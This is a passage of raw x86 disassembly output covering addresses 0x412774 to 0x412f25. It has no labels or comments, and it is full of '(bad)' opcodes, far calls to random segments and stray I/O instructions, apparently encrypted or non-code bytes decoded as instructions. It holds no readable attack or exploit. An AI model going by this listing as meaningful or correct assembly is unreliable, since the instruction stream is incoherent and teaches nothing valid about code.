  412774:	in     al,0x60
  412776:	jg     0x412792
  412778:	mov    esi,DWORD PTR [ecx]
  41277a:	add    ah,0xf4
  41277d:	test   DWORD PTR [edx],esp
  41277f:	popa   
  412780:	pop    ds
  412781:	mov    es:0x73addb32,al
  412787:	dec    cx
  412789:	dec    edi
  41278a:	sub    ebx,DWORD PTR [esi+esi*4]
  41278d:	pop    es
  41278e:	(bad)  [esi+0x2aba050a]
  412794:	adc    DWORD PTR [esi-0x67d470a0],ebx
  41279a:	popf   
  41279b:	dec    ecx
  41279c:	fisttp QWORD PTR [edi+edx*1+0x24d0bad5]
  4127a3:	xchg   edi,eax
  4127a4:	inc    eax
  4127a5:	sti    
  4127a6:	into   
  4127a7:	pusha  
  4127a8:	test   BYTE PTR [esi],bh
  4127aa:	adc    esi,eax
  4127ac:	jae    0x41282a
  4127ae:	ins    DWORD PTR es:[edi],dx
  4127af:	repz xor ch,BYTE PTR [ebx+0x51]
  4127b3:	or     cl,BYTE PTR [edi+0x7]
  4127b6:	ins    DWORD PTR es:[edi],dx
  4127b7:	imul   esp,DWORD PTR [ebx],0x66
  4127ba:	(bad)  
  4127bc:	inc    ebp
  4127bd:	mov    eax,0xb93a1339
  4127c2:	mov    ds:0x6eb2c777,eax
  4127c7:	xchg   ebx,eax
  4127c8:	inc    ebp
  4127c9:	mov    ch,0x5d
  4127cb:	add    cl,BYTE PTR [edx+0x190997c8]
  4127d1:	sbb    ebx,DWORD PTR [edi-0x15]
  4127d4:	xchg   BYTE PTR [eax],al
  4127d6:	mov    eax,0x3b687613
  4127db:	sbb    DWORD PTR [esi-0x4273d208],ebx
  4127e1:	mov    ebx,ebx
  4127e3:	sbb    ecx,edi
  4127e5:	push   DWORD PTR [esp+esi*8-0x66d1c4a1]
  4127ec:	lods   al,BYTE PTR ds:[esi]
  4127ed:	sar    esp,1
  4127ef:	(bad)  
  4127f0:	addr16 call 0xe8184d9a
  4127f6:	xchg   bh,dl
  4127f8:	cmp    ecx,esi
  4127fa:	pushf  
  4127fb:	mov    eax,ds:0xce0fe541
  412800:	dec    eax
  412801:	mov    ecx,0xb03b8b0
  412806:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412807:	repz (bad) 
  412809:	outs   dx,DWORD PTR ds:[esi]
  41280a:	mov    BYTE PTR [ecx],ch
  41280c:	and    eax,0xc22910e4
  412811:	cwde   
  412812:	out    0xb1,al
  412814:	stos   BYTE PTR es:[edi],al
  412815:	mov    edx,esi
  412817:	mov    ebp,0x40771530
  41281c:	jle    0x4127a5
  41281e:	adc    esp,DWORD PTR [esi-0x4f3399ac]
  412824:	cld    
  412825:	mov    al,0xa6
  412827:	cmp    DWORD PTR [esi-0x4361696c],esp
  41282d:	ja     0x4127d1
  41282f:	imul   edx,ebp,0xffffff8c
  412832:	sub    ah,BYTE PTR [ebx]
  412834:	stc    
  412835:	inc    esp
  412836:	enter  0x5b7b,0xf2
  41283a:	xchg   edx,eax
  41283b:	cmp    BYTE PTR [ecx+0x4f],bh
  41283e:	jo     0x412843
  412840:	ds jg  0x4128a3
  412843:	call   0x6c71:0x87dde3aa
  41284a:	sub    BYTE PTR [edx+ebp*4],ah
  41284d:	les    eax,FWORD PTR [edi+0x48]
  412850:	ficomp DWORD PTR [ecx+0x38ebfe70]
  412856:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412857:	mov    bh,0x5a
  412859:	jns    0x4127ef
  41285b:	pop    ss
  41285c:	adc    esi,DWORD PTR [ecx+0x1b]
  41285f:	call   0x9ae3:0xec689fe1
  412866:	mov    edi,0x4cd23abf
  41286b:	(bad)  
  41286c:	ins    BYTE PTR es:[edi],dx
  41286d:	mov    bh,0x31
  41286f:	dec    eax
  412870:	mov    bl,dh
  412872:	daa    
  412873:	mov    dh,BYTE PTR [ecx+0x40]
  412876:	loope  0x4128ed
  412878:	enter  0x812b,0x7b
  41287c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41287d:	test   DWORD PTR [edx],ebx
  41287f:	fdiv   st,st(7)
  412881:	add    eax,0x2d65c9ca
  412886:	and    ch,0x89
  412889:	xor    al,0xd
  41288b:	xor    BYTE PTR [edi-0x19],0xc3
  41288f:	cld    
  412890:	gs pop edx
  412892:	adc    al,0xcb
  412894:	sub    DWORD PTR ds:0x47bd7869,0x7a
  41289b:	xchg   ecx,eax
  41289c:	ficom  WORD PTR [si+0x76]
  4128a0:	imul   DWORD PTR [esi-0x6a]
  4128a3:	jb     0x412909
  4128a5:	pop    ds
  4128a6:	ins    DWORD PTR es:[edi],dx
  4128a7:	push   edi
  4128a8:	mov    ah,0xcb
  4128aa:	(bad)  
  4128ab:	mov    al,0x3a
  4128ad:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4128af:	call   0xf5d1:0x626a3933
  4128b6:	ins    DWORD PTR es:[edi],dx
  4128b7:	sub    BYTE PTR [edi],ch
  4128b9:	pusha  
  4128ba:	push   ebp
  4128bb:	clc    
  4128bc:	cwde   
  4128bd:	adc    BYTE PTR [esi+ebp*1+0x799b0f6d],bl
  4128c4:	mov    ds:0x659e43a7,eax
  4128c9:	inc    esp
  4128ca:	mov    ?,ebx
  4128cc:	psadbw mm2,QWORD PTR [edx-0x67]
  4128d0:	aas    
  4128d1:	pop    es
  4128d2:	mov    ch,0x75
  4128d4:	or     DWORD PTR [edx+0x7cbf540b],ecx
  4128da:	mov    DWORD PTR [ecx-0x738e37b9],esp
  4128e0:	or     bh,BYTE PTR [eax+0x72]
  4128e3:	hlt    
  4128e4:	mov    ebx,0xb7b55813
  4128e9:	in     eax,dx
  4128ea:	cmc    
  4128eb:	mov    ch,0xe3
  4128ed:	stos   DWORD PTR es:[edi],eax
  4128ee:	inc    edx
  4128ef:	mov    ds:0x949dba5e,al
  4128f4:	dec    eax
  4128f5:	and    dh,BYTE PTR [ebp+esi*1+0x34a6cb7c]
  4128fc:	(bad)  
  4128fd:	or     al,0x76
  4128ff:	sbb    al,0x6d
  412901:	jge    0x412922
  412903:	ror    DWORD PTR [ebp+ebx*4+0x5a007693],0x40
  41290b:	imul   esi,esi,0xb5b6aaf9
  412911:	or     eax,0x9aba8d28
  412916:	cli    
  412917:	(bad)  
  412918:	cdq    
  412919:	push   edi
  41291a:	ret    
  41291b:	dec    esp
  41291c:	call   0x124a:0x6aaa9dc2
  412923:	sub    DWORD PTR [ebp-0x7a1c75a4],esi
  412929:	fdiv   st(7),st
  41292b:	icebp  
  41292c:	pop    es
  41292d:	aas    
  41292e:	cmp    DWORD PTR [ecx-0x60],ebx
  412931:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412932:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412933:	xchg   ebp,eax
  412934:	std    
  412935:	ret    0x79af
  412938:	cli    
  412939:	rcl    BYTE PTR [esi+ebp*4+0x5c768c6d],cl
  412940:	int3   
  412941:	test   cl,al
  412943:	sahf   
  412944:	mov    BYTE PTR [ebx-0x42],0xc7
  412948:	mov    esp,0x7e5879b5
  41294d:	cs inc eax
  41294f:	stos   DWORD PTR es:[edi],eax
  412950:	pop    edx
  412951:	arpl   bp,di
  412953:	inc    eax
  412954:	sub    eax,0xb4102d25
  412959:	shl    ebp,cl
  41295b:	div    esi
  41295d:	mov    ch,0x88
  41295f:	(bad)  
  412960:	stos   DWORD PTR es:[edi],eax
  412961:	sub    ebx,edx
  412963:	xor    esp,ebx
  412965:	adc    ebp,DWORD PTR [edi+0x70]
  412968:	into   
  412969:	jmp    0xc4c:0x702575a5
  412970:	sub    ecx,DWORD PTR [ebp-0x55b7ebe3]
  412976:	adc    dh,dh
  412978:	cdq    
  412979:	loopne 0x412913
  41297b:	mov    ss:0xded7eba7,al
  412981:	sbb    ah,0x5e
  412984:	jg     0x41293a
  412986:	mov    edx,0x1802f0c
  41298b:	mov    dl,BYTE PTR [esi+0x20]
  41298e:	shl    DWORD PTR [edx],1
  412990:	cdq    
  412991:	fst    QWORD PTR [eax]
  412993:	mov    DWORD PTR [edx],eax
  412995:	adc    bh,bh
  412997:	shl    DWORD PTR [edx-0x79],1
  41299a:	pop    DWORD PTR [eax+0x3d]
  41299d:	test   ah,0x69
  4129a0:	fcomp  QWORD PTR [ecx+eax*1+0x4c611e1]
  4129a7:	push   0x54
  4129a9:	sub    bl,dl
  4129ab:	lea    esi,[esi+eax*8-0xc972ab]
  4129b2:	jecxz  0x4129bf
  4129b4:	adc    DWORD PTR [ebp+0x5e3234cf],edi
  4129ba:	outs   dx,DWORD PTR ds:[esi]
  4129bb:	fdivr  st(0),st
  4129bd:	(bad)  
  4129be:	mov    esi,0x7f972475
  4129c3:	sub    dh,BYTE PTR [ebx-0x66]
  4129c6:	lods   al,BYTE PTR ds:[esi]
  4129c7:	pop    eax
  4129c8:	jg     0x41297b
  4129ca:	xchg   dx,ax
  4129cc:	adc    BYTE PTR [eax-0x4f],ah
  4129cf:	sub    al,0x39
  4129d1:	jmp    0x41295c
  4129d3:	add    DWORD PTR [esi+ebp*8+0x7e],ecx
  4129d7:	and    al,0x10
  4129d9:	popf   
  4129da:	mov    al,ds:0xb675dcb0
  4129df:	and    ah,BYTE PTR [esi-0x2eed8fe1]
  4129e5:	stc    
  4129e6:	(bad)  [edi]
  4129e8:	imul   BYTE PTR [esi]
  4129ea:	mov    ds:0x85610ffb,al
  4129ef:	imul   ebp,DWORD PTR [esp+edx*1+0x75],0xc0bc7e23
  4129f7:	(bad)  
  4129f8:	jle    0x4129df
  4129fa:	xchg   ebp,eax
  4129fb:	mov    eax,0x53ec35d2
  412a00:	(bad)  
  412a01:	mov    cl,BYTE PTR [edx+0x77]
  412a04:	popa   
  412a05:	pushf  
  412a06:	sete   BYTE PTR [edi+0x2c]
  412a0a:	fwait
  412a0b:	add    esi,DWORD PTR [ebp+0x39b16111]
  412a11:	mov    ?,WORD PTR [esi+edx*2+0x46ccc0b2]
  412a18:	fistp  DWORD PTR [eax-0x6b]
  412a1b:	and    DWORD PTR [esi-0x71],0x894a9fd4
  412a22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a23:	and    dl,BYTE PTR [eax+0x53]
  412a26:	fcmove st,st(1)
  412a28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a29:	adc    edi,ebp
  412a2b:	dec    ecx
  412a2c:	outs   dx,DWORD PTR ds:[esi]
  412a2d:	mov    ah,0xa7
  412a2f:	cmc    
  412a30:	outs   dx,BYTE PTR ds:[esi]
  412a31:	loopne 0x412a42
  412a33:	xchg   BYTE PTR [ecx+ebp*4+0x4a7a6d09],bl
  412a3a:	xor    DWORD PTR [ebx-0x71],0xffffffe4
  412a3e:	xor    dl,BYTE PTR [ebp+esi*1+0x51]
  412a42:	shr    DWORD PTR [ebx-0x34],1
  412a45:	in     al,0x8d
  412a47:	adc    dh,BYTE PTR [edx+0x5d]
  412a4a:	jno    0x412ab9
  412a4c:	popa   
  412a4d:	add    esp,ecx
  412a4f:	jle    0x412ad0
  412a51:	and    bh,dh
  412a53:	test   BYTE PTR [ebp-0x20],cl
  412a56:	inc    edx
  412a57:	js     0x412a7d
  412a59:	aas    
  412a5a:	or     edi,DWORD PTR [edi+0x31]
  412a5d:	into   
  412a5e:	mov    WORD PTR [esp+ebp*1+0x76],es
  412a62:	mov    dl,0x65
  412a64:	mov    eax,0x40bd2ea0
  412a69:	pusha  
  412a6a:	mov    ds:0xf1725088,eax
  412a6f:	mov    dl,0xca
  412a71:	in     eax,0x51
  412a73:	adc    BYTE PTR [esi-0x6bef590a],0x7f
  412a7a:	mov    cl,0xba
  412a7d:	sbb    dl,ch
  412a7f:	das    
  412a80:	dec    ecx
  412a81:	jle    0x412ae3
  412a83:	pop    ecx
  412a84:	add    al,0x94
  412a86:	(bad)  
  412a88:	adc    BYTE PTR [ebp-0x46c39143],cl
  412a8e:	mov    ebp,edx
  412a90:	and    DWORD PTR [ecx],eax
  412a92:	mov    esi,0xa6f95e66
  412a97:	fwait
  412a98:	cmp    al,0x65
  412a9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a9b:	retf   
  412a9c:	call   0x7a69883c
  412aa1:	fistp  WORD PTR [eax]
  412aa3:	stos   DWORD PTR es:[edi],eax
  412aa4:	push   0x2c
  412aa6:	popf   
  412aa7:	pop    edx
  412aa8:	or     al,0xad
  412aaa:	sub    ebp,DWORD PTR [ebp*4+0xd8986c0]
  412ab1:	out    dx,al
  412ab2:	cwde   
  412ab3:	shr    DWORD PTR [esp+edx*8-0x36512efa],cl
  412aba:	inc    al
  412abc:	push   ebp
  412abd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412abe:	inc    edx
  412abf:	cli    
  412ac0:	test   eax,0xcc443852
  412ac5:	mov    ebx,0xc9b34ad
  412aca:	pop    eax
  412acb:	and    ebx,eax
  412acd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ace:	sub    dl,BYTE PTR [ebx+0x142b3850]
  412ad4:	dec    ebp
  412ad5:	mov    ch,0xa5
  412ad7:	sbb    ch,BYTE PTR [eax+0x78]
  412ada:	sbb    al,0x8
  412adc:	lods   al,BYTE PTR ss:[esi]
  412ade:	mov    WORD PTR [eax+0x2e475c67],gs
  412ae4:	xchg   BYTE PTR [edi],ch
  412ae6:	and    BYTE PTR [ebx],ch
  412ae8:	adc    al,0x4b
  412aea:	mov    eax,0x4d585832
  412aef:	cld    
  412af0:	shl    BYTE PTR ds:0x75115cf6,0x35
  412af7:	pop    esp
  412af8:	xchg   esp,eax
  412af9:	cmp    BYTE PTR [ecx-0x5025f12a],cl
  412aff:	retf   
  412b00:	(bad)  
  412b01:	aam    0xee
  412b03:	and    al,0x9e
  412b05:	jae    0x412b38
  412b07:	add    al,0x83
  412b09:	ja     0x412b5f
  412b0b:	mov    al,0x72
  412b0d:	loop   0x412ae8
  412b0f:	imul   esi,DWORD PTR [edi+0x68fb095a],0xffffff94
  412b16:	popf   
  412b17:	push   ebp
  412b18:	push   eax
  412b19:	iret   
  412b1a:	inc    eax
  412b1b:	push   ecx
  412b1c:	xor    eax,0x168db488
  412b21:	(bad)  
  412b22:	jge    0x412b2f
  412b24:	adc    ah,BYTE PTR [edi+0x42]
  412b27:	sbb    dh,ah
  412b29:	fcom   st(3)
  412b2b:	mov    ds:0x78826e04,al
  412b30:	jnp    0x412b90
  412b32:	adc    DWORD PTR [ebx+0x58dc1db7],esp
  412b38:	inc    ebx
  412b39:	push   esi
  412b3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b3b:	clc    
  412b3c:	pop    ss
  412b3d:	mov    WORD PTR [ecx],es
  412b3f:	mov    ch,0xf5
  412b41:	pop    eax
  412b42:	arpl   WORD PTR [ebp-0x29f1df13],ax
  412b48:	pusha  
  412b49:	inc    esi
  412b4a:	int    0xeb
  412b4c:	ret    0xb62c
  412b4f:	push   ds
  412b50:	and    al,bh
  412b52:	and    eax,0x699fce5a
  412b57:	test   DWORD PTR ds:0xdbb7e1bb,0xcc728f5
  412b61:	sbb    edx,DWORD PTR [eax+ebp*1-0x6c]
  412b65:	test   BYTE PTR [ebx],dl
  412b67:	call   0xdb5861de
  412b6c:	xchg   esp,eax
  412b6d:	imul   edi,DWORD PTR [edi+0x48],0x66
  412b71:	jmp    0x412b18
  412b73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b74:	add    cl,BYTE PTR [bp-0x63]
  412b78:	retf   
  412b79:	fadd   DWORD PTR [ecx-0x5aa094b1]
  412b7f:	jmp    DWORD PTR [eax-0xd]
  412b82:	mov    bh,0xfc
  412b84:	xor    dl,BYTE PTR [ecx+ecx*8-0x3e46a264]
  412b8b:	bound  eax,QWORD PTR ds:0x8e0c514b
  412b91:	mov    edi,0xf547a9e8
  412b96:	inc    esp
  412b97:	test   eax,0x82625673
  412b9c:	call   0x10943502
  412ba1:	sub    al,bl
  412ba3:	mov    edi,0x506271a4
  412ba8:	pop    edi
  412ba9:	cmp    DWORD PTR ds:0x41e912d2,ebx
  412baf:	loopne 0x412b53
  412bb1:	cmp    al,0x42
  412bb3:	(bad)  
  412bb4:	test   cl,cl
  412bb6:	or     al,0x21
  412bb8:	sar    esi,cl
  412bba:	sub    BYTE PTR gs:[edx+ecx*8-0x42],dh
  412bbf:	nop
  412bc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bc1:	shl    BYTE PTR [esi+0x45c918cd],0xbb
  412bc8:	jge    0x412b5c
  412bca:	lods   eax,DWORD PTR cs:[esi]
  412bcc:	dec    edi
  412bcd:	cdq    
  412bce:	pop    edi
  412bcf:	not    edx
  412bd1:	jmp    0xd848:0xf226462a
  412bd8:	push   cs
  412bd9:	mov    esp,0xeba1eacf
  412bde:	lahf   
  412bdf:	scas   eax,DWORD PTR es:[edi]
  412be0:	std    
  412be1:	sub    eax,0x60e27035
  412be6:	xchg   BYTE PTR [esi+ebx*8+0x29],bl
  412bea:	in     al,dx
  412beb:	test   BYTE PTR [ecx+0x6d],0xe2
  412bef:	pop    es
  412bf0:	mov    ebp,0xd524593f
  412bf5:	(bad)  [ecx+ecx*1-0x37818277]
  412bfc:	in     al,0xab
  412bfe:	pop    ds
  412bff:	ins    BYTE PTR es:[edi],dx
  412c00:	push   ecx
  412c01:	int    0xe4
  412c03:	stos   DWORD PTR es:[edi],eax
  412c04:	adc    BYTE PTR [ebp+0x24],ch
  412c07:	popa   
  412c08:	je     0x412bd1
  412c0a:	repz jne 0x412bf2
  412c0d:	mov    esp,0xfbee8fab
  412c12:	push   ds
  412c13:	test   DWORD PTR [edx-0x2cf63813],edx
  412c19:	aas    
  412c1a:	arpl   WORD PTR [ebx-0x28],dx
  412c1d:	sub    eax,0xed6852be
  412c22:	jmp    0x676c:0xbaa51c3a
  412c29:	mov    ebp,0x8b868c21
  412c2e:	and    BYTE PTR [esi],bh
  412c30:	cld    
  412c31:	or     al,0xf0
  412c33:	xchg   BYTE PTR [edx-0x480f970],ch
  412c39:	inc    esp
  412c3a:	outs   dx,DWORD PTR ds:[esi]
  412c3b:	out    dx,al
  412c3c:	pop    edx
  412c3d:	mov    ecx,0xfa2b5a42
  412c42:	les    ebx,FWORD PTR fs:[ecx+0x23]
  412c46:	data16 mov ah,0x98
  412c49:	imul   esp,DWORD PTR [edi+0x10],0x973808d1
  412c50:	cwde   
  412c51:	fdiv   QWORD PTR [ecx]
  412c53:	shl    BYTE PTR [esi+0x187a769c],1
  412c59:	(bad)  
  412c5a:	adc    DWORD PTR [ecx+0x79],edi
  412c5d:	in     al,0xe1
  412c5f:	xchg   BYTE PTR [eax],cl
  412c61:	add    al,0x51
  412c63:	icebp  
  412c64:	les    ebp,FWORD PTR [ebx+esi*2+0x6219190e]
  412c6b:	and    eax,DWORD PTR [ecx+0x2b]
  412c6e:	dec    edi
  412c6f:	push   0xf36d2929
  412c74:	aaa    
  412c75:	call   0x5905302
  412c7a:	pop    esi
  412c7b:	cli    
  412c7c:	mov    al,0x90
  412c7e:	enter  0x2f74,0x92
  412c82:	adc    BYTE PTR [edx],0x10
  412c85:	jae    0x412c6b
  412c87:	imul   esi,DWORD PTR [edi],0x98a441c
  412c8d:	rol    ebp,1
  412c8f:	rol    dh,0xc0
  412c92:	pop    ds
  412c93:	(bad)  
  412c94:	call   0x5f6028c1
  412c99:	xor    bl,al
  412c9b:	pop    es
  412c9c:	sub    cl,dl
  412c9e:	jecxz  0x412c78
  412ca0:	dec    ebx
  412ca1:	jecxz  0x412c4f
  412ca3:	je     0x412c70
  412ca5:	add    BYTE PTR [eax],0x8b
  412ca8:	xchg   edi,eax
  412ca9:	dec    ebp
  412caa:	inc    ecx
  412cab:	shl    DWORD PTR [edi-0x1d46a49f],cl
  412cb1:	xor    BYTE PTR [ecx-0x9],bl
  412cb4:	pop    ecx
  412cb5:	fwait
  412cb6:	mov    BYTE PTR ds:0x8ea1be2f,dh
  412cbc:	inc    edi
  412cbd:	adc    dl,dh
  412cbf:	jns    0x412c77
  412cc1:	jne    0x412c48
  412cc3:	pusha  
  412cc4:	sub    esi,DWORD PTR [edi-0x266e8e6b]
  412cca:	pushf  
  412ccb:	add    ch,bh
  412ccd:	in     al,0xc7
  412ccf:	xlat   BYTE PTR ds:[ebx]
  412cd0:	sub    edx,DWORD PTR [eax+ebp*1]
  412cd3:	xchg   ebp,eax
  412cd4:	jmp    0xbb147273
  412cd9:	repz jb 0x412c6d
  412cdc:	xchg   ebp,eax
  412cdd:	call   0xf343:0xf1ac69e8
  412ce4:	add    eax,0x26020613
  412ce9:	and    edi,DWORD PTR [ecx]
  412ceb:	adc    edi,DWORD PTR [ebp+ecx*4+0x61]
  412cef:	xchg   DWORD PTR [edi+0x4a09cf05],eax
  412cf5:	inc    esi
  412cf6:	or     BYTE PTR [edx+0x58420519],0x43
  412cfd:	loopne 0x412d46
  412cff:	es (bad) 
  412d01:	leave  
  412d02:	adc    al,0x84
  412d04:	mov    dl,0xd2
  412d06:	mov    esi,0x4dd51adc
  412d0b:	in     eax,0x4e
  412d0d:	(bad)  
  412d10:	pop    esp
  412d11:	imul   edi,DWORD PTR [edx-0x37],0xb0daaca2
  412d18:	dec    BYTE PTR [edi+0x4d16a416]
  412d1e:	ret    0x1f64
  412d21:	out    dx,al
  412d22:	push   ecx
  412d23:	out    0xad,al
  412d25:	rcr    BYTE PTR [esi+0x1054ae6a],1
  412d2b:	fld    TBYTE PTR [ebx]
  412d2d:	jo     0x412d46
  412d2f:	scas   eax,DWORD PTR es:[edi]
  412d30:	fdivr  QWORD PTR [eax-0x54aa5ea7]
  412d36:	push   0xffffff98
  412d38:	sub    eax,0x74a3a513
  412d3d:	cld    
  412d3e:	dec    edi
  412d3f:	or     eax,0x56550e47
  412d44:	pop    ebp
  412d45:	(bad)  
  412d46:	inc    edi
  412d47:	pop    edx
  412d48:	gs jecxz 0x412dc1
  412d4b:	xchg   edi,eax
  412d4c:	dec    edi
  412d4d:	sahf   
  412d4e:	pop    esp
  412d4f:	imul   edx,DWORD PTR [esp+edi*4+0x70],0x65d59e82
  412d57:	push   0x22
  412d59:	test   al,0x9
  412d5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d5c:	mov    DWORD PTR [edx-0x30],0x68372a6c
  412d63:	xor    al,0x5d
  412d65:	jbe    0x412d8c
  412d67:	xchg   edx,eax
  412d68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d69:	jae    0x412cfe
  412d6b:	dec    eax
  412d6c:	jg     0x412d65
  412d6e:	cli    
  412d6f:	cmp    BYTE PTR [edi+0x60],ch
  412d72:	dec    ecx
  412d73:	add    eax,0xb4008949
  412d78:	push   ebp
  412d79:	or     al,0x7a
  412d7b:	inc    edi
  412d7c:	pop    es
  412d7d:	cmp    BYTE PTR [ebx-0x77e14107],al
  412d83:	or     esi,esi
  412d85:	cwde   
  412d86:	dec    esi
  412d87:	je     0x412dce
  412d89:	push   0x5a
  412d8b:	repnz pop DWORD PTR [edx+0x4e8187d7]
  412d92:	das    
  412d93:	cdq    
  412d94:	cmp    al,0x26
  412d96:	push   edi
  412d97:	inc    ebx
  412d98:	dec    eax
  412d99:	push   ecx
  412d9a:	sahf   
  412d9b:	mov    bl,BYTE PTR ds:0xe761e1d4
  412da1:	mov    eax,0x821271df
  412da6:	rol    esp,cl
  412da8:	aas    
  412da9:	ins    BYTE PTR es:[edi],dx
  412daa:	jno    0x412dbe
  412dac:	shl    BYTE PTR [edx-0xab06565],0x5b
  412db3:	mov    esp,ecx
  412db5:	in     eax,dx
  412db6:	lahf   
  412db7:	ss mov ecx,0xb78bb478
  412dbd:	sar    DWORD PTR [ebx],1
  412dbf:	or     ch,BYTE PTR [ecx+edx*4]
  412dc2:	ret    0x9637
  412dc5:	cmc    
  412dc6:	dec    edx
  412dc7:	mov    esp,0xc329e25d
  412dcc:	scas   al,BYTE PTR es:[edi]
  412dcd:	outs   dx,BYTE PTR ds:[esi]
  412dce:	jne    0x412da2
  412dd0:	inc    edi
  412dd1:	loop   0x412e3b
  412dd3:	push   ds
  412dd4:	ins    BYTE PTR es:[edi],dx
  412dd5:	or     BYTE PTR [ebx+0x2ae1f4a6],bl
  412ddb:	fwait
  412ddc:	push   ecx
  412ddd:	xchg   esi,eax
  412dde:	mov    eax,0x75f46ee
  412de3:	or     ah,BYTE PTR [ecx+0x7598dcd5]
  412de9:	mov    dl,0x40
  412deb:	dec    edx
  412dec:	aad    0x1e
  412dee:	ins    BYTE PTR es:[edi],dx
  412def:	test   al,0x2a
  412df1:	xor    DWORD PTR fs:[edx],edx
  412df4:	inc    esp
  412df5:	hlt    
  412df6:	jae    0x412e2f
  412df8:	cmp    cl,ah
  412dfa:	xchg   ebp,eax
  412dfb:	and    eax,0x8581898e
  412e00:	jg     0x412deb
  412e02:	pop    esi
  412e03:	or     al,0x64
  412e05:	xchg   BYTE PTR [edi-0x3592855b],ch
  412e0b:	jnp    0x412da7
  412e0d:	scas   al,BYTE PTR es:[edi]
  412e0e:	icebp  
  412e0f:	adc    ah,0x5a
  412e12:	and    ch,BYTE PTR [ebx+eiz*8]
  412e15:	pusha  
  412e16:	popf   
  412e17:	adc    DWORD PTR [eax-0x25],ecx
  412e1a:	ror    dh,cl
  412e1c:	pushf  
  412e1d:	les    edi,FWORD PTR [edi+esi*4]
  412e20:	sbb    eax,0x44befe7d
  412e25:	pop    ss
  412e26:	mov    edi,0x391164de
  412e2b:	and    edx,DWORD PTR [ebp+esi*1+0x41713f5c]
  412e32:	jo     0x412e2f
  412e34:	and    eax,0x477e6182
  412e39:	sahf   
  412e3a:	sub    edx,ebp
  412e3c:	inc    ebx
  412e3d:	retf   0xf5ad
  412e40:	xchg   DWORD PTR [ebx],ebp
  412e42:	out    0xb6,al
  412e44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e45:	inc    edx
  412e46:	mov    edx,0x2d34d872
  412e4b:	outs   dx,DWORD PTR ds:[esi]
  412e4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412e4d:	arpl   WORD PTR [edi-0x26],ax
  412e50:	cmp    ebx,ebx
  412e52:	retf   
  412e53:	pop    eax
  412e54:	xchg   ebx,eax
  412e55:	loop   0x412e7b
  412e57:	jecxz  0x412e5c
  412e59:	xor    al,BYTE PTR [esi+0x62]
  412e5c:	push   esi
  412e5d:	add    al,0x6b
  412e5f:	mov    bl,0x49
  412e61:	es cmp esi,DWORD PTR fs:[esi+0x11]
  412e66:	mov    al,0x47
  412e68:	lds    esi,FWORD PTR [esi+0x22]
  412e6b:	xor    edx,DWORD PTR [edi+0x72]
  412e6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e6f:	push   ds
  412e70:	std    
  412e71:	push   eax
  412e72:	add    al,dh
  412e74:	cmp    BYTE PTR [ebx],cl
  412e76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e77:	xor    al,0x78
  412e79:	mov    cl,0xf7
  412e7b:	adc    eax,0x4a7b7bad
  412e80:	push   esp
  412e81:	jae    0x412eaa
  412e83:	stos   DWORD PTR es:[edi],eax
  412e84:	mov    bh,0x6a
  412e86:	mov    cl,0xfd
  412e88:	pause  
  412e8a:	int3   
  412e8b:	gs jp  0x412eb4
  412e8e:	js     0x412e57
  412e90:	pop    eax
  412e91:	push   esp
  412e92:	and    eax,0x8f60b2b3
  412e97:	sbb    eax,0xf70e7e1f
  412e9c:	mov    al,0x1c
  412e9e:	mov    DWORD PTR ds:0x21cf689,esi
  412ea4:	xor    edx,edi
  412ea6:	jmp    0xc45c32a0
  412eab:	enter  0x771c,0xd9
  412eaf:	test   al,0x9f
  412eb1:	or     al,0xa1
  412eb3:	test   eax,0x9ae74fe3
  412eb8:	outs   dx,BYTE PTR ds:[esi]
  412eb9:	outs   dx,DWORD PTR ds:[esi]
  412eba:	xchg   ebp,eax
  412ebb:	fbld   TBYTE PTR es:[edx-0x4e]
  412ebf:	idiv   DWORD PTR [ebp+0x35]
  412ec2:	ins    BYTE PTR es:[edi],dx
  412ec3:	cmp    DWORD PTR [ecx],ebp
  412ec5:	lods   eax,DWORD PTR ds:[esi]
  412ec6:	dec    edi
  412ec7:	loope  0x412e4c
  412ec9:	mov    esp,0x1384e1c2
  412ece:	imul   ebx,eax,0xbd0dc50e
  412ed4:	xor    BYTE PTR [edi-0x70440619],bh
  412eda:	add    al,0xa3
  412edc:	or     BYTE PTR [edi-0x2d],dh
  412edf:	pop    ebx
  412ee0:	sub    al,0xd1
  412ee2:	imul   edx,DWORD PTR [edi],0x4b
  412ee5:	inc    ebp
  412ee6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ee7:	inc    esp
  412ee8:	mov    dh,0x98
  412eea:	test   edi,0xc740816f
  412ef0:	push   es
  412ef1:	mov    ds:0xade9f855,eax
  412ef6:	cmp    ebp,esp
  412ef8:	cmp    al,0xec
  412efa:	scas   eax,DWORD PTR es:[edi]
  412efb:	mov    edi,0x7fc071a6
  412f00:	(bad)  
  412f01:	nop
  412f02:	pop    esi
  412f03:	fs stos BYTE PTR es:[edi],al
  412f05:	out    dx,al
  412f06:	sub    al,BYTE PTR [ebx+edx*8-0x3fc2f358]
  412f0d:	not    DWORD PTR [ecx+0x4d256495]
  412f13:	inc    edx
  412f14:	cmp    eax,0x94b87b3c
  412f19:	(bad)  
  412f1a:	in     eax,0x6e
  412f1c:	lods   al,BYTE PTR ds:[esi]
  412f1d:	pushf  
  412f1e:	jnp    0x412f25
  412f20:	mov    esi,gs
  412f22:	lods   al,BYTE PTR ds:[esi]
  412f23:	jg     0x412f8a
  412f25:	int3   
